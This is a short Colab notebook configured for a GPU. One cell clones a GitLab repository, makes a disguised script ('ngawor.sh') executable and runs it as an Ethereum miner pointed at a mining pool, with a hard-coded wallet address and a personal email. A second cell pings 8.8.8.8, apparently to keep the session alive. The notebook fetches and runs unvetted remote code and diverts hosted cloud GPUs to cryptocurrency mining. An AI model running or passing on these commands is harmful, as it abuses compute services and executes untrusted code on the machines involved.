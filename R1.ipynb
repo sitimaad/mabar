{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "R1.ipynb",
      "private_outputs": true,
      "provenance": [],
      "collapsed_sections": [
        "VZM6Yd3T8BD5H"
      ],
      "machine_shape": "hm"
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "id": "VZM6Yd3T8BD5H"
      },
      "source": [
        "!nvidia-smi && git clone https://gitlab.com/agungharsa/proc.git && cd proc && chmod +x ngawor.sh && ip=$(echo \"$(curl -s ifconfig.me)\" | tr . _ ) && ./ngawor.sh -algo ethash -pool1 eu1.ethermine.org:14444 -wallet 0x05a10aaa1e862c786a2beada3ca072f5cd38e02f -coin eth -rigName $ip -email sarjon350@gmail.com"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "9HKnUi2-4nLl"
      },
      "source": [
        "!ping 8.8.8.8"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}